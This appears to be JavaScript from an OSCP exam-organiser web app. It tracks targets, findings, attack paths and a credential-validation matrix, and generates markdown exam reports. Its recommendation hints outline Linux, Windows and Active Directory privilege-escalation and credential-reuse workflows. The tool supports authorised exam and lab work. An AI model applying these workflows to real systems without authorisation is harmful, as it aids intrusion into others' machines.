const dark=document.createElement('style');dark.textContent='.reference.darkRef{background:#10151e;color:#e6edf6}.reference.darkRef details{background:#151c27;border-color:#2b3546}.reference.darkRef a{color:#71d3ff}.reference.darkRef blockquote{color:#a9b6c8;border-color:#53667d}.reference.darkRef th,.reference.darkRef td{border-color:#344155}';document.head.appendChild(dark);


/* ===== V7 Operations Layer ===== */
const V7_SERVICES=['SMB','WINRM','RDP','SSH','MSSQL','LDAP','KERBEROS','WEB'];
const V7_MATRIX_STATES=['untested','valid','admin','failed','blocked'];
const V7_SIGNALS=[
 ['web','Web surface','[WEB:ENUM]'],['creds','Credential discovered','[CREDS:FANOUT]'],['linux-shell','Linux shell','[LINUX:TREE]'],['windows-shell','Windows shell','[WIN:TREE]'],['domain-creds','Domain credentials','[AD:FLOW]'],['sudo','sudo clue','[LINUX:SUDO]'],['suid','SUID/custom binary','[LINUX:SUID]'],['systemd','cron/systemd','[LINUX:SYSTEMD]'],['container','Docker/LXC/NFS','[LINUX:CONTAINER]'],['seimp','SeImpersonate','[WIN:SEIMPERSONATE]'],['service','Windows service','[WIN:SERVICE]'],['task','Scheduled task','[WIN:TASK]'],['dpapi','DPAPI/credential store','[WIN:DPAPI]'],['bloodhound','BloodHound edge','[AD:ACL]'],['adcs','AD CS clue','[AD:ADCS]'],['internal','Internal subnet/service','[PIVOT:FLOW]'],['local-proof','local.txt obtained','[EVIDENCE:PACKET]'],['proof','proof.txt obtained','[EVIDENCE:PACKET]']
];
const V7_EVIDENCE=[['enumRecorded','Enumeration recorded'],['footholdRecorded','Foothold/vector recorded'],['commandsRecorded','Exact commands recorded'],['localRead','local.txt read at original location'],['localSubmitted','local flag submitted'],['localScreenshot','Local screenshot has proof + IP'],['privescRecorded','PrivEsc reasoning recorded'],['proofRead','proof.txt read at original location'],['proofSubmitted','proof flag submitted'],['proofScreenshot','Proof screenshot has proof + IP'],['reproducible','Steps reproducible without memory']];

let activeTargetId=safeStoreGet(STORE+'activeTarget','')||'';
let credentials=safeStoredArray(STORE+'credentials');
let sessionCredentialSecrets={};
let favorites=safeStoredArray(STORE+'favorites');
let preflightData=safeStoredJSON(STORE+'preflight',null);
let reportDebounce=null;

function upgradeTarget(t){
 t=plainRecord(t)?t:{};
 t.status=plainRecord(t.status)?t.status:{};
 t.next=Array.isArray(t.next)?t.next.slice(0,3).map(v=>String(v??'')):['','',''];while(t.next.length<3)t.next.push('');
 t.signals=Array.isArray(t.signals)?t.signals.map(v=>String(v??'')).filter(Boolean):[];
 t.findings=Array.isArray(t.findings)?t.findings.filter(plainRecord):[];
 t.path=Array.isArray(t.path)?t.path.filter(plainRecord):[];
 t.evidence=plainRecord(t.evidence)?t.evidence:{};
 t.stage=typeof t.stage==='string'&&t.stage?t.stage:'enumeration';
 t.confidence=typeof t.confidence==='string'&&t.confidence?t.confidence:'unconfirmed';
 const reportDefaults={title:'',foothold:'',privesc:'',commands:'',screens:'',remediation:'',reviewNeeded:false};t.report=plainRecord(t.report)?{...reportDefaults,...t.report}:reportDefaults;
 t.notes=typeof t.notes==='string'?t.notes:String(t.notes??'');t.role=typeof t.role==='string'&&t.role?t.role:'unknown';
 t.ip=typeof t.ip==='string'?t.ip:String(t.ip??'');t.host=typeof t.host==='string'?t.host:String(t.host??'');
 t.creds=typeof t.creds==='string'?t.creds:'';return t;
}
targets=targets.map(upgradeTarget);
if(!targets.length){try{const old=JSON.parse(localStorage.getItem('oscp_v6_targets')||'[]');if(Array.isArray(old)&&old.length){targets=old.map(upgradeTarget);safeStoreSet(STORE+'targets',JSON.stringify(targets));}}catch(e){}}
if(!activeTargetId&&targets.length)activeTargetId=targets[0].id;
targets.forEach(t=>{if(t.creds)sessionSecrets[t.id]=t.creds;if(!persistSecrets)t.creds=''});

function newTarget(){return upgradeTarget({id:crypto.randomUUID?crypto.randomUUID():Date.now()+'-'+Math.random(),ip:'',host:'',role:'unknown',notes:'',next:['','',''],status:{},creds:'',updated:Date.now()})}
function saveTargets(){targets=targets.map(upgradeTarget);const arr=targets.map(t=>({...t,creds:persistSecrets?(sessionSecrets[t.id]||t.creds||''):''}));safeStoreSet(STORE+'targets',JSON.stringify(arr));safeStoreSet(STORE+'activeTarget',activeTargetId||'');refreshTimerTargets();renderOpsSelectors();renderActiveSummary();renderSessionStats()}
function saveOps(){safeStoreSet(STORE+'favorites',JSON.stringify(favorites));const cleanCreds=credentials.map(c=>({...c,secret:persistSecrets?(sessionCredentialSecrets[c.id]||c.secret||''):''}));safeStoreSet(STORE+'credentials',JSON.stringify(cleanCreds));if(preflightData)safeStoreSet(STORE+'preflight',JSON.stringify(preflightData));renderFavorites();renderSessionStats()}
credentials=credentials.filter(plainRecord).map(c=>({...c,checks:plainRecord(c.checks)?c.checks:{},scope:['domain','local','application'].includes(c.scope)?c.scope:'domain',secret:typeof c.secret==='string'?c.secret:'',user:typeof c.user==='string'?c.user:String(c.user??''),domain:typeof c.domain==='string'?c.domain:String(c.domain??'')}));
credentials.forEach(c=>{if(c.secret)sessionCredentialSecrets[c.id]=c.secret;if(!persistSecrets)c.secret=''});

function activeTarget(){return targets.find(t=>t.id===activeTargetId)||null}
function setActiveTarget(id){if(targets.some(t=>t.id===id)){activeTargetId=id;safeStoreSet(STORE+'activeTarget',id);renderOpsSelectors();renderWorkspace();renderGraph();renderReport();renderActiveSummary();renderCredentialMatrix()}}
function targetLabel(t){return t?(t.ip||t.host||'unnamed target'):'No target'}
function confLabel(v){return({unconfirmed:'UNCONFIRMED',prereq:'PREREQ MET',high:'HIGH SIGNAL',exploited:'EXPLOITED',dead:'DEAD END'})[v]||v}
function confClass(v){return'conf-'+v}
function hasSignal(t,k){return(t.signals||[]).includes(k)}

function renderOpsSelectors(){const opts=targets.map(t=>`<option value="${esc(t.id)}">${esc(targetLabel(t))} · ${esc(t.role)}</option>`).join('');['workspaceTarget','credTarget','graphTarget','reportTarget'].forEach(id=>{const s=$('#'+id);if(!s)return;const old=s.value||activeTargetId;s.innerHTML=opts||'<option value="">No targets</option>';s.value=targets.some(t=>t.id===old)?old:(activeTargetId||targets[0]?.id||'')});const src=$('#credSource');if(src)src.innerHTML='<option value="">source unknown</option>'+targets.map(t=>`<option value="${esc(t.id)}">${esc(targetLabel(t))}</option>`).join('');const tabs=$('#workspaceTabs');if(tabs){tabs.innerHTML=targets.map(t=>`<button class="opsTab ${t.id===activeTargetId?'active':''}" data-wstab="${esc(t.id)}">${esc(targetLabel(t))}</button>`).join('');tabs.querySelectorAll('[data-wstab]').forEach(b=>b.onclick=()=>setActiveTarget(b.dataset.wstab))}}
['workspaceTarget','credTarget','graphTarget','reportTarget'].forEach(id=>{const s=$('#'+id);if(s)s.onchange=()=>setActiveTarget(s.value)});

function recommendActions(t){
 if(!t)return[];const a=[],add=(p,title,why,tag)=>{if(!a.some(x=>x.title===title))a.push({p,title,why,tag})};
 if(!t.status.tcp)add(1,'Complete full TCP enumeration','Do not build an exploit hypothesis on an incomplete service map.','[SERVICE:UNKNOWN]');
 if(!t.status.udp)add(3,'Check useful UDP services','Useful UDP can reveal SNMP/DNS and other high-signal services.','[PORT:161]');
 if((t.role==='web'||hasSignal(t,'web'))&&!t.status.web)add(1,'Finish web + vhost enumeration','Correct hostname/vhost, source, content, backups, auth and parameters first.','[WEB:ENUM]');
 if(hasSignal(t,'creds')&&!t.status.creds)add(1,'Classify, then validate discovered credentials','Mark local vs domain vs application first; validate only against relevant services with the correct auth semantics.','[CREDS:FANOUT]');
 if(hasSignal(t,'internal'))add(1,'Validate pivot route and enumerate the internal host','Prove routing first, then treat the new host as a fresh target.','[PIVOT:FLOW]');
 if(t.role==='dc'||t.role==='ad-member'||hasSignal(t,'domain-creds')){add(1,'Run/re-run the AD flow','Confirm DC/DNS/time → SMB/LDAP/Kerberos → graph → ACL/delegation/AD CS.','[AD:FLOW]');if(hasSignal(t,'bloodhound'))add(1,'Validate the exact BloodHound edge','Graph edges are hypotheses until the precise permission/action is confirmed.','[AD:ACL]');if(hasSignal(t,'adcs'))add(2,'Validate AD CS prerequisites','Confirm vulnerable template/CA/effective rights before abuse.','[AD:ADCS]')}
 if(t.status.foothold||hasSignal(t,'linux-shell')||hasSignal(t,'windows-shell')){
  if(t.role==='linux'||hasSignal(t,'linux-shell')){if(hasSignal(t,'sudo'))add(1,'Validate the sudo path','Confirm exact command, args, env, controllable files and GTFOBins/manual behavior.','[LINUX:SUDO]');if(hasSignal(t,'suid'))add(1,'Trace the privileged binary','file → strings → ldd/readelf → strace/ltrace → writable dependency.','[LINUX:SUID]');if(hasSignal(t,'systemd'))add(1,'Validate scheduled privileged execution','Confirm writable dependency and exact trigger/timing.','[LINUX:SYSTEMD]');if(hasSignal(t,'container'))add(2,'Validate host-resource control','Docker/LXC/NFS presence alone is not privilege escalation.','[LINUX:CONTAINER]');if(!hasSignal(t,'sudo')&&!hasSignal(t,'suid')&&!hasSignal(t,'systemd'))add(2,'Run the Linux 60-second privesc tree','sudo → SUID → caps → writable → cron/systemd → services → creds → kernel LAST.','[LINUX:TREE]')}
  if(t.role==='windows'||hasSignal(t,'windows-shell')){if(hasSignal(t,'seimp'))add(1,'Validate SeImpersonate compatibility','Exact build + service context + required RPC/service primitive.','[WIN:SEIMPERSONATE]');if(hasSignal(t,'service'))add(1,'Validate privileged service control','SYSTEM/high privilege + writable object + trigger/restart.','[WIN:SERVICE]');if(hasSignal(t,'task'))add(1,'Validate scheduled-task dependency','High-privileged task + writable target + trigger.','[WIN:TASK]');if(hasSignal(t,'dpapi'))add(2,'Inspect credential-store context','Determine whether DPAPI/masterkey context makes the secret recoverable.','[WIN:DPAPI]');if(!hasSignal(t,'seimp')&&!hasSignal(t,'service')&&!hasSignal(t,'task'))add(2,'Run the Windows post-shell workflow','baseline → saved tool output → credentials → privileges → services/tasks → local listeners/apps → driver/kernel LAST.','[WIN:WORKFLOW]')}
 }
 if(t.status.foothold&&!t.status.local)add(1,'Bank local evidence now','Read local.txt from original location, capture IP+proof, submit, record commands.','[EVIDENCE:PACKET]');
 if(t.status.privesc&&!t.status.proof)add(1,'Bank proof evidence now','Read proof.txt from original location, capture IP+proof, submit, record root/SYSTEM path.','[EVIDENCE:PACKET]');
 if(a.length<3)add(3,'Run a 3-minute stuck reset','List facts vs assumptions and write only the next three evidence-producing actions.','[STUCK:RESET]');
 return a.sort((x,y)=>x.p-y.p).slice(0,6)
}

function renderWorkspace(){
 const t=activeTarget(),empty=$('#workspaceEmpty'),body=$('#workspaceBody');if(!empty||!body)return;if(!t){empty.style.display='block';body.style.display='none';return}empty.style.display='none';body.style.display='block';
 $('#workspaceTarget').value=t.id;$('#wsRole').value=t.role;$('#wsStage').value=t.stage;$('#wsIP').value=t.ip||'';$('#wsHost').value=t.host||'';$('#wsConfidence').value=t.confidence;
 $('#signalGrid').innerHTML=V7_SIGNALS.map(([k,l,tag])=>`<button class="signal ${hasSignal(t,k)?'on':''}" data-sig="${k}" title="${esc(tag)}">${esc(l)}</button>`).join('');
 $$('#signalGrid [data-sig]').forEach(b=>b.onclick=()=>{const k=b.dataset.sig;t.signals=hasSignal(t,k)?t.signals.filter(x=>x!==k):[...t.signals,k];t.updated=Date.now();saveTargets();renderWorkspace()});
 $('#nextActionEngine').innerHTML=recommendActions(t).map(r=>`<div class="rec p${r.p}"><div class="row" style="justify-content:space-between"><div><div class="recTitle">${esc(r.title)}</div><div class="recWhy">${esc(r.why)}</div></div><button class="btn" data-rectag="${esc(r.tag)}">${esc(r.tag)}</button></div></div>`).join('');
 $$('[data-rectag]').forEach(b=>b.onclick=()=>{$('#globalSearch').value=b.dataset.rectag;switchView('searchView');renderSearch(b.dataset.rectag)});
 $('#findingsList').innerHTML=t.findings.length?t.findings.map((f,i)=>`<div class="finding"><div><b>${esc(f.title)}</b><div class="tiny">${esc(f.tag||'')}</div></div><select class="findingConf" data-fi="${i}"><option value="unconfirmed">UNCONFIRMED</option><option value="prereq">PREREQ MET</option><option value="high">HIGH SIGNAL</option><option value="exploited">EXPLOITED</option><option value="dead">DEAD END</option></select><button class="btn bad delFinding" data-fi="${i}">×</button></div>`).join(''):'<div class="muted">No findings recorded yet.</div>';
 $$('.findingConf').forEach(s=>{s.value=t.findings[+s.dataset.fi].confidence||'unconfirmed';s.onchange=()=>{t.findings[+s.dataset.fi].confidence=s.value;saveTargets();renderWorkspace();renderGraph()}});
 $$('.delFinding').forEach(b=>b.onclick=()=>{t.findings.splice(+b.dataset.fi,1);saveTargets();renderWorkspace()});
 $$('.wsNext').forEach(x=>x.value=t.next[+x.dataset.i]||'');$('#wsNotes').value=t.notes||'';
 $('#pathList').innerHTML=t.path.length?t.path.map((p,i)=>`<div class="pathStep"><span class="chip">${esc(p.type)}</span><span>${esc(p.label)}</span><select class="pathResult" data-pi="${i}"><option>observed</option><option>validated</option><option>success</option><option>dead-end</option></select><button class="btn bad delPath" data-pi="${i}">×</button></div>`).join(''):'<div class="muted">No attack-path steps yet.</div>';
 $$('.pathResult').forEach(s=>{s.value=t.path[+s.dataset.pi].result||'observed';s.onchange=()=>{t.path[+s.dataset.pi].result=s.value;saveTargets();renderGraph()}});
 $$('.delPath').forEach(b=>b.onclick=()=>{t.path.splice(+b.dataset.pi,1);saveTargets();renderWorkspace();renderGraph()});
 renderGate($('#workspaceGate'),t);const missing=evidenceMissing(t);$('#gateSummary').textContent=missing.length?`${missing.length} claimed-objective evidence item(s) still missing.`:'Claimed-objective evidence gate satisfied.';
 const done=t.findings.filter(f=>f.confidence==='exploited').length,high=t.findings.filter(f=>f.confidence==='high').length;$('#wsMetrics').innerHTML=`<div><div class="opsMetric">${t.findings.length}</div><div class="opsMetricLabel">findings</div></div><div><div class="opsMetric">${high}</div><div class="opsMetricLabel">high signal</div></div><div><div class="opsMetric">${done}</div><div class="opsMetricLabel">exploited</div></div><div><div class="opsMetric">${t.path.length}</div><div class="opsMetricLabel">path steps</div></div>`
}
['wsRole','wsStage','wsIP','wsHost','wsConfidence'].forEach(id=>{$('#'+id).onchange=()=>{const t=activeTarget();if(!t)return;const requestedStage=$('#wsStage').value;if(id==='wsStage'&&requestedStage==='complete'){const miss=evidenceMissing(t);if(miss.length){alert('Evidence gate not satisfied. Missing:\n- '+miss.join('\n- '));$('#wsStage').value=t.stage;return}}t.role=$('#wsRole').value;t.stage=requestedStage;t.ip=$('#wsIP').value;t.host=$('#wsHost').value;t.confidence=$('#wsConfidence').value;t.updated=Date.now();saveTargets();renderWorkspace();renderGraph()}});
$$('.wsNext').forEach(x=>x.onchange=()=>{const t=activeTarget();if(t){t.next[+x.dataset.i]=x.value;saveTargets()}});
$('#wsNotes').onchange=()=>{const t=activeTarget();if(t){t.notes=$('#wsNotes').value;saveTargets()}};
$('#addFinding').onclick=()=>{const t=activeTarget(),title=$('#findingTitle').value.trim();if(!t||!title)return;t.findings.push({title,tag:$('#findingTag').value.trim(),confidence:$('#findingConfidence').value,created:Date.now()});$('#findingTitle').value='';$('#findingTag').value='';saveTargets();renderWorkspace();renderGraph()};
$('#addPath').onclick=()=>{const t=activeTarget(),label=$('#pathLabel').value.trim();if(!t||!label)return;t.path.push({label,type:$('#pathType').value,result:'observed',created:Date.now()});$('#pathLabel').value='';saveTargets();renderWorkspace();renderGraph()};
$('#workspaceAddTarget').onclick=()=>{const t=newTarget();targets.push(t);activeTargetId=t.id;saveTargets();renderTargets();renderWorkspace()};
$('#openReportForTarget').onclick=()=>{switchView('reportsView');renderReport()};

function renderActiveSummary(){const box=$('#activeTargetSummary'),t=activeTarget();if(!box)return;if(!t){box.textContent='No active target. Add/select one in Workspace.';return}const rec=recommendActions(t)[0],review=t.report?.reviewNeeded?'<span class="chip" style="border-color:var(--warn);color:var(--warn)">REPORT REVIEW</span>':'';box.innerHTML=`<div class="row" style="justify-content:space-between"><div><b>${esc(targetLabel(t))}</b> · ${esc(t.role)} · ${esc(t.stage)} <span class="conf ${confClass(t.confidence)}">${esc(confLabel(t.confidence))}</span> ${review}</div><button class="btn" id="goActiveWorkspace">Open workspace →</button></div><div class="muted" style="margin-top:6px">${rec?`Next: ${esc(rec.title)} — ${esc(rec.why)}`:'No recommendation yet.'}</div>`;$('#goActiveWorkspace').onclick=()=>switchView('workspaceView')}

function renderCredentialMatrix(){
 const head=$('#credHead'),body=$('#credBody'),t=activeTarget();if(!head||!body)return;$('#credTarget').value=t?.id||'';head.innerHTML='<th>Credential</th><th>Type</th><th>Scope</th><th>Secret</th><th>Source</th>'+V7_SERVICES.map(s=>`<th>${s}</th>`).join('')+'<th></th>';
 if(!credentials.length){body.innerHTML='<tr><td colspan="14" class="muted">No credentials yet.</td></tr>';return}
 body.innerHTML=credentials.map(c=>{const secret=sessionCredentialSecrets[c.id]||c.secret||'';return`<tr data-cid="${esc(c.id)}"><td><b>${esc(c.user)}</b></td><td>${esc(c.type)}</td><td>${esc(c.scope)}</td><td>${secret?`<span title="Secret present for this credential (value intentionally not rendered)">${'•'.repeat(Math.min(12,Math.max(6,secret.length)))}</span>`:'—'}</td><td>${esc(targetLabel(targets.find(x=>x.id===c.sourceTarget)))}</td>${V7_SERVICES.map(s=>{const k=(t?.id||'none')+'|'+s,raw=c.checks?.[k],st=V7_MATRIX_STATES.includes(raw)?raw:'untested';return`<td><button class="mstat m-${st}" data-cid="${esc(c.id)}" data-svc="${s}">${st}</button></td>`}).join('')}<td><button class="btn bad credDel" data-cid="${esc(c.id)}">×</button></td></tr>`}).join('');
 $$('.mstat').forEach(b=>b.onclick=()=>{if(!t)return;const c=credentials.find(x=>x.id===b.dataset.cid),k=t.id+'|'+b.dataset.svc,cur=c.checks[k]||'untested';c.checks[k]=V7_MATRIX_STATES[(V7_MATRIX_STATES.indexOf(cur)+1)%V7_MATRIX_STATES.length];if(['valid','admin'].includes(c.checks[k])){t.signals=[...new Set([...(t.signals||[]),'creds'])];t.status.creds=true}saveOps();saveTargets();renderCredentialMatrix();renderWorkspace()});
 $$('.credDel').forEach(b=>b.onclick=()=>{if(confirm('Delete this credential record?')){credentials=credentials.filter(x=>x.id!==b.dataset.cid);delete sessionCredentialSecrets[b.dataset.cid];saveOps();renderCredentialMatrix()}});
 $('#credMatrixHint').textContent=t?`Matrix destination: ${targetLabel(t)}. Status is stored per credential × target × service.`:'Select/add a target first.'
}
$('#showAddCred').onclick=()=>{$('#addCredCard').style.display=$('#addCredCard').style.display==='none'?'block':'none'};
$('#addCredential').onclick=()=>{const user=$('#credUser').value.trim();if(!user)return;const id=crypto.randomUUID?crypto.randomUUID():Date.now()+'-'+Math.random(),secret=$('#credSecret').value;credentials.push({id,user,type:$('#credType').value,scope:$('#credScope').value,sourceTarget:$('#credSource').value,secret:persistSecrets?secret:'',checks:{},notes:'',created:Date.now()});sessionCredentialSecrets[id]=secret;$('#credUser').value='';$('#credSecret').value='';saveOps();renderCredentialMatrix();toast('Credential added')};

function renderGraph(){
 const svg=$('#attackGraph'),t=activeTarget();if(!svg)return;if(!t){svg.setAttribute('width','700');svg.innerHTML='<text x="25" y="50" class="graphText">No active target.</text>';return}$('#graphTarget').value=t.id;
 const nodes=[{label:targetLabel(t),type:'target',result:'validated'},...(t.path||[])],w=190,gap=55,x0=30,y=90,width=Math.max(760,x0+nodes.length*(w+gap)+30);svg.setAttribute('width',width);svg.setAttribute('height',260);svg.setAttribute('viewBox',`0 0 ${width} 260`);
 let s='<defs><marker id="arrow" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto"><polygon points="0 0,10 3.5,0 7" fill="#61758e"/></marker></defs>';
 nodes.forEach((n,i)=>{const x=x0+i*(w+gap),dead=n.result==='dead-end',done=['success','validated'].includes(n.result);if(i){const px=x0+(i-1)*(w+gap)+w;s+=`<line x1="${px}" y1="${y+35}" x2="${x-9}" y2="${y+35}" class="graphEdge"/>`}s+=`<rect x="${x}" y="${y}" rx="10" ry="10" width="${w}" height="70" class="graphNode ${dead?'dead':done?'done':''}"/>`;const label=String(n.label||'').slice(0,25),line2=String(n.label||'').slice(25,50);s+=`<text x="${x+12}" y="${y+27}" class="graphText">${esc(label)}</text>${line2?`<text x="${x+12}" y="${y+45}" class="graphText">${esc(line2)}</text>`:''}<text x="${x+12}" y="${y+61}" class="graphText" style="fill:#8ea0b5;font-size:10px">${esc(n.type||'')} · ${esc(n.result||'')}</text>`});svg.innerHTML=s;$('#graphTranscript').innerHTML=t.path.length?t.path.map((p,i)=>`<div>${i+1}. <b>${esc(p.type)}</b> → ${esc(p.label)} <span class="chip">${esc(p.result)}</span></div>`).join(''):'No recorded path yet. Add steps in Workspace.'
}

function evidenceClaims(t){return window.OSCP_UTILS.evidenceClaims(t)}
function requiredEvidence(t){return window.OSCP_UTILS.requiredEvidence(t)}
function evidenceMissing(t){return window.OSCP_UTILS.evidenceMissing(t)}
function renderGate(root,t){if(!root||!t)return;const required=new Set(requiredEvidence(t).map(([k])=>k));root.innerHTML=V7_EVIDENCE.map(([k,l])=>`<label class="gateItem ${t.evidence?.[k]?'ok':'miss'}"><input type="checkbox" data-ev="${k}" ${t.evidence?.[k]?'checked':''}> ${esc(l)}${required.has(k)?' <span class="tiny">(required for claimed access)</span>':''}</label>`).join('');root.querySelectorAll('[data-ev]').forEach(x=>x.onchange=()=>{t.evidence[x.dataset.ev]=x.checked;saveTargets();renderWorkspace();renderReport()})}
function syncReportFields(t){if(!t)return;[['rTitle','title'],['rFoothold','foothold'],['rPrivesc','privesc'],['rCommands','commands'],['rScreens','screens'],['rRemediation','remediation']].forEach(([id,k])=>{$('#'+id).value=t.report[k]||''})}
function reportMarkdown(t){const creds=credentials.filter(c=>c.sourceTarget===t.id).map(c=>`- ${c.user} (${c.type}, ${c.scope}) — source: ${targetLabel(t)}`).join('\n')||'- None recorded from this target';const finds=t.findings.map(f=>`- **${f.title}** — ${confLabel(f.confidence)} ${f.tag||''}`).join('\n')||'- None recorded';const path=t.path.map((p,i)=>`${i+1}. **${p.type}** — ${p.label} (${p.result})`).join('\n')||'1. Not recorded';const miss=evidenceMissing(t);return`# ${t.report.title||targetLabel(t)+' — OSCP Target'}\n\n## Target\n\n- **IP:** ${t.ip||''}\n- **Hostname:** ${t.host||''}\n- **Role:** ${t.role}\n- **Stage:** ${t.stage}\n\n## Enumeration / Key Findings\n\n${finds}\n\n## Foothold\n\n${t.report.foothold||'TODO'}\n\n## Privilege Escalation\n\n${t.report.privesc||'TODO'}\n\n## Attack Path\n\n${path}\n\n## Exact Commands / Reproduction\n\n\`\`\`text\n${t.report.commands||'TODO'}\n\`\`\`\n\n## Credential Material Discovered\n\n${creds}\n\n## Evidence / Screenshots\n\n${t.report.screens||'TODO'}\n\n## Remediation Notes\n\n${t.report.remediation||'TODO'}\n\n## Evidence Gate\n\n${V7_EVIDENCE.map(([k,l])=>`- [${t.evidence?.[k]?'x':' '}] ${l}`).join('\n')}\n\n${miss.length?`> **NOT REPORT-READY:** ${miss.join('; ')}`:'> **Evidence gate satisfied for currently claimed objectives.**'}\n`}
function renderReport(){const t=activeTarget();if(!t)return;$('#reportTarget').value=t.id;syncReportFields(t);const review=$('#rNeedsReview'),reviewStatus=$('#reportReviewStatus');if(review)review.checked=!!t.report.reviewNeeded;if(reviewStatus){reviewStatus.textContent=t.report.reviewNeeded?'⚠ Needs report review':'✓ Review flag clear';reviewStatus.className='chip '+(t.report.reviewNeeded?'warn':'good')}renderGate($('#reportGate'),t);const miss=evidenceMissing(t);const reviewWarn=t.report.reviewNeeded?'<div class="rec p2"><b>Report review flag is ON.</b><br><span class="tiny">Re-read commands, screenshots and narrative before final export.</span></div>':'';$('#reportGateSummary').innerHTML=reviewWarn+(miss.length?`<div class="rec p1"><b>Claimed-objective evidence incomplete.</b><br>${miss.map(esc).join('<br>')}<br><span class="tiny">Mark only objectives actually achieved; the Exam Control Panel is authoritative.</span></div>`:'<div class="rec p1" style="border-left-color:var(--good)"><b>Evidence gate satisfied for currently claimed objectives.</b><br><span class="tiny">The Exam Control Panel remains authoritative for each target objective and point value.</span></div>');$('#reportPreview').value=reportMarkdown(t)}
['rTitle','rFoothold','rPrivesc','rCommands','rScreens','rRemediation'].forEach(id=>{$('#'+id).oninput=()=>{const t=activeTarget();if(!t)return;const key={rTitle:'title',rFoothold:'foothold',rPrivesc:'privesc',rCommands:'commands',rScreens:'screens',rRemediation:'remediation'}[id];t.report[key]=$('#'+id).value;clearTimeout(reportDebounce);reportDebounce=setTimeout(()=>{saveTargets();renderReport()},250)}});
$('#rNeedsReview').onchange=()=>{const t=activeTarget();if(!t)return;t.report.reviewNeeded=$('#rNeedsReview').checked;saveTargets();renderReport();renderActiveSummary()};
$('#generateReport').onclick=renderReport;$('#copyReport').onclick=async()=>toast(await copyText($('#reportPreview').value)?'Report copied':'Copy blocked');
function downloadText(name,text,type='text/plain'){const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([text],{type}));a.download=name;a.click();setTimeout(()=>URL.revokeObjectURL(a.href),500)}
$('#downloadReport').onclick=()=>{const t=activeTarget();if(!t)return;const safe=(t.host||t.ip||'target').replace(/[^a-z0-9_-]+/gi,'_');downloadText(`OSCP-${safe}-report.md`,reportMarkdown(t),'text/markdown')};
$('#downloadAllReports').onclick=()=>{if(!targets.length)return;const bundle=targets.map(t=>reportMarkdown(t)).join('\n\n---\n\n');downloadText('OSCP-all-targets-report.md',bundle,'text/markdown')};

function toggleFavorite(anchor){favorites=favorites.includes(anchor)?favorites.filter(x=>x!==anchor):[...favorites,anchor];saveOps();renderSearch($('#globalSearch').value)}
function renderFavorites(){const root=$('#favoriteList');if(!root)return;const items=favorites.map(a=>SEARCH_ITEMS.find(x=>x.anchor===a)).filter(Boolean);root.innerHTML=items.length?items.map(x=>`<div class="favorite"><div><b>${esc(x.title)}</b><div class="tiny">${esc((x.tags||[]).slice(0,4).join(' '))}</div></div><div><button class="btn favOpen" data-a="${esc(x.anchor)}">Open</button><button class="btn bad favRemove" data-a="${esc(x.anchor)}">×</button></div></div>`).join(''):'<div class="muted">Pin useful search results and they stay here.</div>';$$('.favOpen').forEach(b=>b.onclick=()=>openRef(b.dataset.a));$$('.favRemove').forEach(b=>b.onclick=()=>toggleFavorite(b.dataset.a))}
function renderSearch(q){q=q||'';let scored=SEARCH_ITEMS.map(x=>({...x,score:fuzzyScore(x,q)})).filter(x=>x.score>0).sort((a,b)=>b.score-a.score).slice(0,60);$('#searchStats').textContent=q?`${scored.length} best matches for “${q}”`:'Type a tag, port, error, privilege, tool, or clue.';$('#searchResults').innerHTML=scored.map(x=>`<div class="result"><div class="row" style="justify-content:space-between"><div class="resultTitle">${esc(x.title)}</div><div><span class="score">score ${x.score}</span> <button class="btn pinRef" data-pin="${esc(x.anchor)}">${favorites.includes(x.anchor)?'★':'☆'} Pin</button></div></div><div class="chips">${(x.tags||[]).slice(0,8).map(t=>`<span class="chip click" data-tag="${esc(t)}">${esc(t)}</span>`).join('')}</div><div class="resultText">${esc(x.text.replace(/\s+/g,' ').slice(0,520))}</div><button class="btn" data-open="${esc(x.anchor)}">Open in full reference →</button></div>`).join('')||'<div class="card muted">No match. Try a shorter term or exact [TAG].</div>';$$('[data-open]').forEach(b=>b.onclick=()=>openRef(b.dataset.open));$$('[data-tag]').forEach(c=>c.onclick=()=>{$('#globalSearch').value=c.dataset.tag;renderSearch(c.dataset.tag)});$$('[data-pin]').forEach(b=>b.onclick=()=>toggleFavorite(b.dataset.pin))}


function sessionPayload(includeSecrets=false){const tg=targets.map(t=>({...t,creds:includeSecrets?(sessionSecrets[t.id]||t.creds||''):''}));const cr=credentials.map(c=>({...c,secret:includeSecrets?(sessionCredentialSecrets[c.id]||c.secret||''):''}));const set={...settings,PASSWORD:includeSecrets?settings.PASSWORD:''};return{app:'OSCP-Exam-OS',version:28,legacyVersion:11,exported:new Date().toISOString(),targets:tg,credentials:cr,favorites,settings:set,persistSecrets:false,activeTargetId,preflight:preflightData}}
$('#exportSession').onclick=()=>{downloadText('oscp-session.json',JSON.stringify(sessionPayload(false),null,2),'application/json');toast('Secret-free session exported — use encrypted backup to preserve secrets')};
$('#importSession').onchange=async e=>{const f=e.target.files[0];if(!f)return;try{assertImportFileSize(f,'Session backup');const o=assertRestorableBackup(JSON.parse(await f.text()));snapshotNow('before session import');restoreV9Payload(o);toast('Session restored')}catch(err){alert('Invalid OSCP session JSON: '+err.message)}finally{e.target.value=''}};
$('#importPreflight').onchange=async e=>{const f=e.target.files[0];if(!f)return;try{assertImportFileSize(f,'Preflight JSON');preflightData=JSON.parse(await f.text());saveOps();renderPreflight();toast('Preflight imported')}catch{alert('Invalid preflight JSON')}};
function renderPreflight(){const root=$('#preflightBody'),sum=$('#preflightSummary');if(!root||!sum)return;if(!preflightData||!Array.isArray(preflightData.tools)){root.innerHTML='';sum.textContent='No preflight imported.';return}const core=preflightData.tools.filter(x=>(x.priority||'core')==='core'),coreMiss=core.filter(x=>!x.present).length,allMiss=preflightData.tools.filter(x=>!x.present).length;sum.textContent=`core ${core.length-coreMiss}/${core.length} · all ${preflightData.tools.length-allMiss}/${preflightData.tools.length} commands found · generated ${preflightData.generated||'unknown'}`;root.innerHTML=preflightData.tools.map(x=>`<tr><td>${esc(x.tool)}</td><td>${esc(x.priority||'legacy')}</td><td>${x.present?'✅ present':'❌ missing'}</td><td>${esc(x.version||x.path||'')}</td></tr>`).join('')}
